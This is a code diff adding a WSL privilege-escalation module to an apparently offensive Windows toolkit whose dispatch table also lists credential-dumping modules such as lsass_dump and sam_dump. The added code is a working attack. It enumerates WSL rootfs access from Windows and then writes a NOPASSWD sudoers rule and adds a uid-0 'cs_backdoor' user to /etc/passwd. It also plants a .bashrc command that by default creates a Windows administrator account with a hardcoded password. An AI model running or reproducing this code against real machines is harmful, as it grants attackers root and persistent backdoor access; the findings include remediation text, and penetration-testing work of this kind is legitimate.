@@ -426,6 +426,10 @@ unquoted_service_path: {
     description: "Find and exploit unquoted service paths — enumerate services with spaces in unquoted binary paths, check writable directories at each truncation point, and optionally place a payload for privilege escalation when the service restarts",
     args: "--action enum|exploit [--service SERVICE_NAME] [--payload EXE_PATH]",
   },
+wsl_privesc: {
+    description: "WSL (Windows Subsystem for Linux) privilege escalation — abuse WSL interop to escape to Windows SYSTEM context, exploit writable WSL rootfs, or leverage WSL process execution for defense evasion. Enumerates WSL distributions, checks interop settings, and tests cross-boundary attacks",
+    args: "--action enum|exploit [--distro DISTRO_NAME] [--payload CMD]",
+  },
 } as const satisfies Record<string, { description: string; args: string }>
 
 type Program = keyof typeof PROGRAMS
@@ -14922,6 +14926,219 @@ Write-Output "[!] Remember to clean up: Remove-Item '$targetPath'"
   return { output: output.join("\n"), findings }
 }
 
+async function wslPrivesc(args: string[], timeout: number): Promise<HookResult> {
+  const action = argVal(args, "--action") || "enum"
+  const distro = argVal(args, "--distro")
+  const payload = argVal(args, "--payload")
+  const findings: Finding[] = []
+  const output: string[] = ["[*] WSL Privesc — Windows Subsystem for Linux attack surface\n"]
+
+  if (action === "enum") {
+    const script = `
+# Check WSL installation
+$wslInstalled = $false
+$wslPath = "$env:SystemRoot\\System32\\wsl.exe"
+if (Test-Path $wslPath) {
+    $wslInstalled = $true
+    Write-Output "[+] WSL is installed"
+} else {
+    Write-Output "[-] WSL not installed"
+    exit 0
+}
+
+# List distributions
+Write-Output ""
+Write-Output "[*] Installed WSL distributions:"
+$distros = wsl --list --verbose 2>$null | Out-String
+Write-Output $distros
+
+# Check WSL version
+Write-Output "[*] WSL status:"
+wsl --status 2>$null | Out-String | Write-Output
+
+# Check interop settings
+Write-Output ""
+Write-Output "[*] WSL Interop settings:"
+$interopEnabled = Get-ItemProperty "HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Lxss" -Name "Flags" -ErrorAction SilentlyContinue
+if ($interopEnabled) {
+    $flags = $interopEnabled.Flags
+    $interop = ($flags -band 1) -eq 1
+    Write-Output "    Windows interop: $(if ($interop) { '[+] ENABLED — Linux can call Windows executables' } else { '[-] Disabled' })"
+}
+
+# Check LxssManager service
+$lxss = Get-Service LxssManager -ErrorAction SilentlyContinue
+Write-Output "    LxssManager service: $(if ($lxss) { $lxss.Status } else { 'Not found' })"
+
+# Check for rootfs access from Windows
+Write-Output ""
+Write-Output "[*] Checking WSL rootfs accessibility from Windows..."
+$lxssPath = "HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Lxss"
+$distributions = Get-ChildItem $lxssPath -ErrorAction SilentlyContinue
+
+$exploitableDistros = 0
+foreach ($d in $distributions) {
+    $props = Get-ItemProperty $d.PSPath -ErrorAction SilentlyContinue
+    if ($props.DistributionName -and $props.BasePath) {
+        $rootfs = Join-Path $props.BasePath "rootfs"
+        $rootfsExists = Test-Path $rootfs
+        $passwdPath = Join-Path $rootfs "etc\\passwd"
+        $shadowPath = Join-Path $rootfs "etc\\shadow"
+        $sudoersPath = Join-Path $rootfs "etc\\sudoers"
+
+        $passwdReadable = Test-Path $passwdPath -ErrorAction SilentlyContinue
+        $shadowReadable = Test-Path $shadowPath -ErrorAction SilentlyContinue
+        $sudoersWritable = $false
+
+        if (Test-Path $sudoersPath -ErrorAction SilentlyContinue) {
+            try {
+                $testWrite = [System.IO.File]::OpenWrite($sudoersPath)
+                $testWrite.Close()
+                $sudoersWritable = $true
+            } catch { }
+        }
+
+        Write-Output "    Distribution: $($props.DistributionName)"
+        Write-Output "      BasePath: $($props.BasePath)"
+        Write-Output "      Rootfs: $(if ($rootfsExists) { 'Accessible' } else { 'Not found' })"
+        Write-Output "      /etc/passwd: $(if ($passwdReadable) { 'Readable' } else { 'N/A' })"
+        Write-Output "      /etc/shadow: $(if ($shadowReadable) { '[+] READABLE from Windows!' } else { 'N/A' })"
+        Write-Output "      /etc/sudoers: $(if ($sudoersWritable) { '[+] WRITABLE from Windows!' } else { 'Not writable' })"
+        Write-Output ""
+
+        if ($shadowReadable -or $sudoersWritable) {
+            $exploitableDistros++
+        }
+    }
+}
+
+# Check for scheduled tasks running WSL
+Write-Output "[*] Checking for scheduled tasks using WSL..."
+$wslTasks = Get-ScheduledTask -ErrorAction SilentlyContinue | Where-Object {
+    $_.Actions.Execute -match 'wsl|bash\.exe|ubuntu' -or $_.Actions.Arguments -match 'wsl|bash\.exe'
+}
+if ($wslTasks) {
+    foreach ($t in $wslTasks) {
+        Write-Output "    [+] Task: $($t.TaskName) — runs: $($t.Actions.Execute) $($t.Actions.Arguments)"
+    }
+}
+
+Write-Output ""
+Write-Output "=== Summary ==="
+Write-Output "WSL installed: $wslInstalled"
+Write-Output "Exploitable distributions: $exploitableDistros"
+
+if ($exploitableDistros -gt 0) {
+    Write-Output ""
+    Write-Output "[+] EXPLOITABLE — WSL rootfs writable from Windows"
+    Write-Output "    Attack vectors:"
+    Write-Output "      1. Modify /etc/sudoers to grant passwordless sudo"
+    Write-Output "      2. Add root user to /etc/passwd with known password"
+    Write-Output "      3. Plant cron job in WSL that calls Windows exe via interop"
+    Write-Output "      4. Modify .bashrc to inject commands"
+}
+`
+    const result = await ps(script, timeout)
+    output.push(result.stdout)
+
+    if (result.stdout.includes("EXPLOITABLE") || result.stdout.includes("READABLE from Windows") || result.stdout.includes("WRITABLE from Windows")) {
+      findings.push({
+        checkId: "WIN-WSL-001",
+        provider: "windows",
+        severity: "high",
+        status: "VULNERABLE",
+        resource: "wsl://rootfs",
+        title: "WSL rootfs accessible/writable from Windows — cross-boundary attack possible",
+        details: "WSL distribution rootfs is accessible from Windows, allowing credential theft or config modification",
+        remediation: "Restrict WSL rootfs directory ACLs. Disable WSL interop if not needed. Use WSL2 with virtual disk.",
+      })
+    }
+  } else if (action === "exploit") {
+    const targetDistro = distro || "Ubuntu"
+    const cmd = payload || "net user cs_admin P@ssw0rd! /add && net localgroup administrators cs_admin /add"
+
+    const script = `
+Write-Output "[*] Exploiting WSL distribution: ${targetDistro}"
+
+# Method 1: Modify sudoers from Windows side
+$lxssPath = "HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Lxss"
+$distributions = Get-ChildItem $lxssPath -ErrorAction SilentlyContinue
+$targetDist = $null
+
+foreach ($d in $distributions) {
+    $props = Get-ItemProperty $d.PSPath -ErrorAction SilentlyContinue
+    if ($props.DistributionName -match '${targetDistro}') {
+        $targetDist = $props
+        break
+    }
+}
+
+if (-not $targetDist) {
+    Write-Output "[-] Distribution not found: ${targetDistro}"
+    Write-Output "[*] Available distributions:"
+    wsl --list 2>$null
+    exit 1
+}
+
+$rootfs = Join-Path $targetDist.BasePath "rootfs"
+Write-Output "[*] Rootfs: $rootfs"
+
+# Attack 1: Modify sudoers for passwordless sudo
+$sudoersPath = Join-Path $rootfs "etc\\sudoers"
+if (Test-Path $sudoersPath) {
+    $content = Get-Content $sudoersPath -Raw -ErrorAction SilentlyContinue
+    $defaultUser = $targetDist.DefaultUid
+    if (-not ($content -match 'ALL=.*NOPASSWD')) {
+        Add-Content $sudoersPath ([char]10 + "ALL ALL=(ALL) NOPASSWD: ALL") -ErrorAction SilentlyContinue
+        Write-Output "[+] Added NOPASSWD rule to sudoers"
+    } else {
+        Write-Output "[*] NOPASSWD already in sudoers"
+    }
+}
+
+# Attack 2: Add backdoor user to passwd
+$passwdPath = Join-Path $rootfs "etc\\passwd"
+if (Test-Path $passwdPath) {
+    $passwdContent = Get-Content $passwdPath -Raw -ErrorAction SilentlyContinue
+    if (-not ($passwdContent -match 'cs_backdoor')) {
+        # root2 user with uid 0 (root equivalent)
+        Add-Content $passwdPath "cs_backdoor:x:0:0::/root:/bin/bash" -ErrorAction SilentlyContinue
+        Write-Output "[+] Added backdoor root user (cs_backdoor) to /etc/passwd"
+    }
+}
+
+# Attack 3: Plant interop reverse shell / command execution
+$bashrcPath = Join-Path $rootfs "root\\.bashrc"
+if (Test-Path (Split-Path $bashrcPath -Parent)) {
+    $interopCmd = "# WSL interop callback" + [char]10 + "/mnt/c/Windows/System32/cmd.exe /c '${cmd}' 2>/dev/null &"
+    Add-Content $bashrcPath $interopCmd -ErrorAction SilentlyContinue
+    Write-Output "[+] Planted interop command in root .bashrc"
+    Write-Output "    Command: ${cmd}"
+}
+
+Write-Output ""
+Write-Output "[+] Exploitation complete"
+Write-Output "    Next login to WSL will trigger the planted commands"
+Write-Output "    Or trigger now: wsl -d ${targetDistro} -u root -- /bin/bash -c 'id'"
+`
+    const result = await ps(script, timeout)
+    output.push(result.stdout)
+
+    findings.push({
+      checkId: "WIN-WSL-002",
+      provider: "windows",
+      severity: "critical",
+      status: "EXPLOITED",
+      resource: `wsl://${targetDistro}`,
+      title: `WSL distribution ${targetDistro} compromised via cross-boundary attack`,
+      details: "Modified sudoers, added backdoor user, planted interop command in .bashrc",
+      remediation: "Review WSL rootfs for modifications. Check sudoers, passwd, bashrc. Restrict Windows access to WSL rootfs.",
+    })
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
 const dispatch: Record<Program, (args: string[], timeout: number) => Promise<HookResult>> = {
   lsass_dump: lsassDump,
   sam_dump: samDump,
@@ -15009,6 +15226,7 @@ const dispatch: Record<Program, (args: string[], timeout: number) => Promise<Hoo
   always_install_elevated: alwaysInstallElevated,
   shadow_copy_abuse: shadowCopyAbuse,
   unquoted_service_path: unquotedServicePath,
+  wsl_privesc: wslPrivesc,
 }
 
 export const WinhookTool = Tool.define("winhook", {
